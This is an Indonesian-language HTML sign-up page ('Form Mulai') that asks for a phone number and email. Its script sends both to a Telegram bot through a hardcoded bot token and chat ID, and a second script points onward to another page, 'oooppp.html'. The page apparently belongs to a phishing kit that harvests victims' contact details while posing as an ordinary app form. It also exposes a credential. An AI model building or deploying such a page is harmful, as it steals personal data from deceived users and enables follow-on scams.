<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1" /><title>Form Mulai</title><style>  body, html {    margin: 0; padding: 0;    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;    background: white;    height: 100vh;    display: flex;    flex-direction: column;  }  .header {    background: #0082fc;    height: 120px;    padding: 40px 20px 0 20px;    display: flex;    align-items: flex-start;    color: white;  }  .back-arrow {    font-size: 24px;    cursor: pointer;    user-select: none;  }  .form-container {    flex-grow: 1;    background: white;    border-top-left-radius: 20px;    border-top-right-radius: 20px;    padding: 30px 20px;    display: flex;    flex-direction: column;  }  .form-title {    font-size: 16px;    font-weight: 600;    color: #333;    margin-bottom: 35px;    line-height: 1.3;  }  label {    font-size: 14px;    font-weight: 500;    color: #5a5a5a;    margin-bottom: 5px;    display: block;  }  input[type="text"], input[type="email"] {    width: 100%;    padding: 12px 15px;    font-size: 14px;    border: none;    border-radius: 8px;    background: #d9ebff;    margin-bottom: 20px;    box-sizing: border-box;    color: #000;  }  input::placeholder {    color: #7a7a7a;  }  button {    width: 100%;    padding: 12px 0;    background: #ffc042;    border: none;    border-radius: 12px;    font-size: 16px;    font-weight: 600;    color: #333;    cursor: pointer;    user-select: none;    box-shadow: 0 2px 5px rgba(0,0,0,0.1);    transition: background-color 0.3s ease;  }  button:hover {    background: #e6ac36;  }</style></head><body>  <div class="header">    <div class="back-arrow" onclick="history.back();">&#8592;</div>  </div>  <div class="form-container">    <div class="form-title">      Masukkan nomor handphone dan email<br />Kamu untuk memulai    </div>    <form id="form">      <label for="phone">Nomor Handphone</label>      <input id="phone" type="text" placeholder="+62" autocomplete="off" inputmode="numeric" />      <label for="email">Email</label>      <input id="email" type="email" placeholder="Email" autocomplete="off" />      <button type="submit">Mulai</button>    </form>  </div><script>  const phoneInput = document.getElementById('phone');  const emailInput = document.getElementById('email');  const form = document.getElementById('form');  // Set nilai awal +62 dan letakkan cursor di akhir input  function setCursorToEnd(el) {    if (el.setSelectionRange) {      el.focus();      const length = el.value.length;      el.setSelectionRange(length, length);    }  }  phoneInput.value = '+62';  setCursorToEnd(phoneInput);  // Fungsi format nomor dengan spasi setiap 3 digit (setelah +62)  function formatPhone(value) {    // Hilangkan semua selain angka    let number = value.replace(/\D/g, '');    // Pastikan +62 ada di depan, hilangkan 62 di awal pada number    if (number.startsWith('62')) {      number = number.substring(2);    }    // Batasi panjang maksimum 13 digit    if (number.length > 13) {      number = number.substring(0, 13);    }    // Kelompokkan angka per 3 digit kecuali sisa 1 atau 2 digit terakhir    let groups = [];    let i = 0;    while(i < number.length){      if(i >= 9) {        groups.push(number.substring(i));        break;      }      groups.push(number.substr(i, 3));      i += 3;    }    return '+62 ' + groups.join(' ');  }  phoneInput.addEventListener('input', (e) => {    // Pastikan prefix +62 tidak bisa dihapus    if (!phoneInput.value.startsWith('+62')) {      phoneInput.value = '+62';      setCursorToEnd(phoneInput);      return;    }    // Format nomor dengan spasi    const formatted = formatPhone(phoneInput.value);    phoneInput.value = formatted;    setCursorToEnd(phoneInput);  });  form.addEventListener('submit', function(e) {    e.preventDefault();    // Ambil dan normalisasi input nomor phone (hilangkan spasi dan +)    let phoneRaw = phoneInput.value.replace(/\s/g, '').replace(/^\+/, '');    // Validasi panjang nomor angka sesudah 62 harus 13 digit tepat atau kurang dari 13 (boleh kurang 1 digit)    if (!phoneRaw.startsWith('62') || phoneRaw.length < 4 || phoneRaw.length > 15) {       alert('Nomor handphone harus diawali +62 dan mengandung 4 sampai 15 digit angka total.');      return;    }    // Cek digit sesudah kode negara    let digitsAfter62 = phoneRaw.substring(2);    if (digitsAfter62.length > 13) {      alert('Nomor handphone maksimal 13 digit angka setelah +62.');      return;    }    // Validasi email harus mengandung '@' dan minimal 3 karakter total    const emailVal = emailInput.value.trim();    if (emailVal.length < 3 || !emailVal.includes('@')) {      alert('Format email tidak valid. Harus mengandung karakter "@"');      return;    }    // Kirim ke Telegram API    const TELEGRAM_BOT_TOKEN = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM';    const TELEGRAM_CHAT_ID = '7213790655';    // Pesan yang akan dikirim (handphone tanpa spasi dan dengan +)    const phoneToSend = '+' + phoneRaw;    const message = `Data baru:\nNomor Handphone: ${phoneToSend}\nEmail: ${emailVal}`;    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;    fetch(url, {      method: 'POST',      headers: {'Content-Type': 'application/json'},      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })    })    .then(res => res.json())    .then(data => {      if(data.ok){        alert('Data berhasil dikirim ke Telegram!');        form.reset();        phoneInput.value = '+62';        setCursorToEnd(phoneInput);      } else {        alert('Error: '+data.description);      }    })    .catch(err => {      alert('Gagal mengirim: '+err.message);    });  });</script><script>  document.getElementById("nextBtn").addEventListener("click", function() {    window.location.href = "oooppp.html";  });</script></body></html>
